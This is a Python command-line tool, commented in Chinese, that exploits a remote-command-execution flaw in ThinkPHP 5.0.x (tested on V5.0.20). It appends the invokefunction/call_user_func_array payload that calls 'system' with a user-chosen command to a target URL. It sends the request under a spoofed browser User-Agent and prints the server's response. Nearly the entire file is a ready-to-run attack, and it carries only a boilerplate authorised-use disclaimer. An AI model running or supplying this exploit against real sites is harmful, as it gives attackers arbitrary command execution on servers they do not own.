# coding=utf-8
'''
目前以验证版本 ThinkPHP V5.0.20
这个工具只是练手而写，太咸鱼了

免责声明：
该工具只能授权验证网站漏洞和站长验证漏洞使用。
禁止用于未授权测试，非法入侵，否则一切后果自负，和本作者无关
'''
from urllib import request,error,parse
import getopt
import sys
def Getopt(argv):
    url = ""
    cmd = ""
    try:
        opst,args = getopt.getopt(argv,"u:r:h",["url=","run=","help="])
        for opt,arg in opst:
            if opt == '-h':
                print("By 樱花の飘落:\n可用参数-u: \n  需要测试的url \n可用参数-r:\n  需要测试的命令\n注意：本软件仅供个人测试使用任何一切违法用途均与该程序无关")
            if opt in ('-u','--url'):
                url = arg
            if opt in ('-r','-run'):
                cmd = arg

        if url =="" or cmd == "":
            print("提示:\n用法存在错误\n使用-h可查看帮助")
            exit()
        return(url,cmd)
    except getopt.GetoptError:
        print("提示:\n用法存在错误\n使用-h可查看帮助")
        exit()
    
def run(url,cmd):
    payload = r'?s=index/\think\App/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]='
    url = str(url) + payload + str(cmd)
    print(url)
    head = {
        'User-Agent':'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML,  like Gecko) Chrome/18.0.1025.166  Safari/535.19'
    }
    req = request.Request(url,headers = head)
    response = request.urlopen(req,timeout=12)
    get_hteml=response.read().decode('utf-8')
    print(get_hteml)
if __name__ == "__main__":
    url = Getopt(sys.argv[1:])[0]
    cmd = Getopt(sys.argv[1:])[1]
    run(url,cmd)




